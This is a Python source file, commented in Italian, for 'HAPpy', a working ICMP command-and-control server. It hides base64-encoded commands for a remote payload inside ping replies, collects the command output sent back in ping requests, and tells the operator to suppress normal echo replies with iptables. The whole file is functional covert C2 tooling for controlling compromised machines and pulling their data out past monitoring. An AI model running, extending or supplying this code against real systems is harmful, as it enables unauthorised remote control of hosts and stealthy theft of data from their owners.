#!/usr/bin/env python3
"""
HAPpy - ICMP C2 Server
========================
Versione ICMP di server.py. Sostituisce HTTP con un canale ICMP covert:

  - Il payload riceve il comando via ICMP Echo Reply (polling attivo)
  - Il payload invia l'output via ICMP Echo Request con magic header
  - La CLI interagisce con questo server esattamente come prima (HTTP locale)

Flusso:
  CLI --[HTTP locale]--> icmp_c2_server --> [ICMP Reply] --> payload
  payload ------------> [ICMP Request] --> icmp_c2_server --> CLI

Utilizzo:
    sudo python3 icmp_c2_server.py [--iface eth0] [--cli-port 8080]

Requisiti:
    pip install scapy flask
    sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
"""

from scapy.all import IP, ICMP, Raw, sniff, send
from flask import Flask, request, jsonify
from datetime import datetime
from threading import Thread, Lock
import base64
import logging
import argparse
import sys
import os

# ── logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("icmp-c2-server")

# ── stato globale ─────────────────────────────────────────────────────────────
current_command = ""          # comando in attesa (testo in chiaro)
last_output     = ""          # ultimo output ricevuto dal payload (letto dalla CLI)
state_lock      = Lock()

OUTPUT_LOG = "../logs/command_output.log"

# Magic header per distinguere i pacchetti C2 dal traffico ICMP normale
# Il payload usa: MAGIC_REQ + base64(output)  per inviare risultati
# Il server usa:  MAGIC_CMD + base64(comando)  per inviare comandi
MAGIC_CMD = b"HCMD:"   # server → payload  (nella Echo Reply)
MAGIC_REP = b"HREP:"   # payload → server  (nella Echo Request)

# ── utility ───────────────────────────────────────────────────────────────────
def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def b64_encode(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("utf-8")

def b64_decode(data: bytes) -> str:
    return base64.b64decode(data).decode("utf-8", errors="ignore")

# ── ICMP handler ──────────────────────────────────────────────────────────────
def handle_icmp(pkt, iface):
    global current_command, last_output

    if not (pkt.haslayer(IP) and pkt.haslayer(ICMP)):
        return

    icmp_type = pkt[ICMP].type
    src_ip    = pkt[IP].src
    payload   = pkt[Raw].load if pkt.haslayer(Raw) else b""

    # ── Echo Request in arrivo dal payload ────────────────────────────────────
    if icmp_type == 8:
        if payload.startswith(MAGIC_REP):
            # Il payload ci manda l'output di un comando
            encoded = payload[len(MAGIC_REP):]
            try:
                output = b64_decode(encoded)
            except Exception:
                output = encoded.decode("utf-8", errors="ignore")

            log.info(f"[OUTPUT] da {src_ip}:\n{output}")
            entry = f"[{timestamp()}] {output}"

            # Salva in RAM per la CLI (endpoint /result)
            with state_lock:
                last_output = output

            # Salva su disco (log)
            os.makedirs(os.path.dirname(OUTPUT_LOG) if os.path.dirname(OUTPUT_LOG) else ".", exist_ok=True)
            with open(OUTPUT_LOG, "a") as f:
                f.write(f"{entry}\n{'-' * 50}\n")

            # ACK al payload
            ack = (
                IP(dst=src_ip) /
                ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) /
                Raw(load=b"ACK")
            )
            send(ack, verbose=False, iface=iface)

        else:
            # Beacon del payload: legge e azzera il comando in un colpo solo
            with state_lock:
                cmd             = current_command
                current_command = ""   # FIX: azzera subito, non si ripete mai

            if cmd:
                encoded_cmd = (MAGIC_CMD + b64_encode(cmd).encode()).decode()
                reply = (
                    IP(dst=src_ip) /
                    ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) /
                    Raw(load=encoded_cmd.encode("utf-8"))
                )
                send(reply, verbose=False, iface=iface)
                log.info(f"[CMD] inviato a {src_ip}: {repr(cmd)}")
            else:
                reply = (
                    IP(dst=src_ip) /
                    ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) /
                    Raw(load=b"NOP")
                )
                send(reply, verbose=False, iface=iface)

# ── Flask API (identica alla versione HTTP, usata dalla CLI) ──────────────────
app = Flask(__name__)

@app.route("/command", methods=["GET"])
def get_command():
    """
    La CLI fa polling su questo endpoint.
    Quando torna vuoto significa che il comando è stato consegnato al payload
    e la CLI può mettersi ad aspettare l'output su /result.
    """
    with state_lock:
        cmd = current_command
    if not cmd:
        return ""
    return b64_encode(cmd)

@app.route("/result", methods=["POST", "GET"])
def post_result():
    """
    FIX: la CLI legge qui l'output dell'ultimo comando.
    GET  → restituisce last_output (testo in chiaro) e lo azzera
    POST → compatibilità con la versione HTTP originale (ignorato)
    """
    global last_output
    if request.method == "POST":
        return "OK"
    with state_lock:
        out         = last_output
        last_output = ""          # consumato: la prossima GET tornerà vuota
    return out

@app.route("/set_command", methods=["POST"])
def set_command():
    """La CLI imposta un nuovo comando."""
    global current_command
    command = request.form.get("command", "").strip()
    if not command:
        return "Error!\n", 400
    with state_lock:
        current_command = command
    log.info(f"[CLI] nuovo comando: {repr(command)}")
    return "", 200

@app.route("/status", methods=["GET"])
def status():
    with state_lock:
        cmd = current_command
    return jsonify({"pending_command": cmd, "channel": "ICMP"})

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="HAPpy ICMP C2 Server")
    parser.add_argument("--iface",    default=None,  help="Interfaccia di rete (default: auto)")
    parser.add_argument("--cli-port", type=int, default=8080, help="Porta HTTP per la CLI (default: 8080)")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  HAPpy ICMP C2 Server")
    log.info(f"  Canale C2   : ICMP (magic={MAGIC_CMD!r} / {MAGIC_REP!r})")
    log.info(f"  CLI API     : http://127.0.0.1:{args.cli_port}")
    log.info(f"  Output log  : {OUTPUT_LOG}")
    log.info("=" * 60)
    log.info("Ricorda: sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP")

    # Flask in background (solo per la CLI locale)
    flask_thread = Thread(
        target=lambda: app.run(host="127.0.0.1", port=args.cli_port, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    log.info(f"CLI API avviata su http://127.0.0.1:{args.cli_port}")

    # Sniffer ICMP (main thread)
    log.info("In ascolto ICMP... (Ctrl+C per uscire)")
    try:
        sniff(
            filter="icmp",
            iface=args.iface,
            prn=lambda pkt: handle_icmp(pkt, args.iface),
            store=False,
        )
    except KeyboardInterrupt:
        log.info("Server fermato.")
        sys.exit(0)

if __name__ == "__main__":
    main()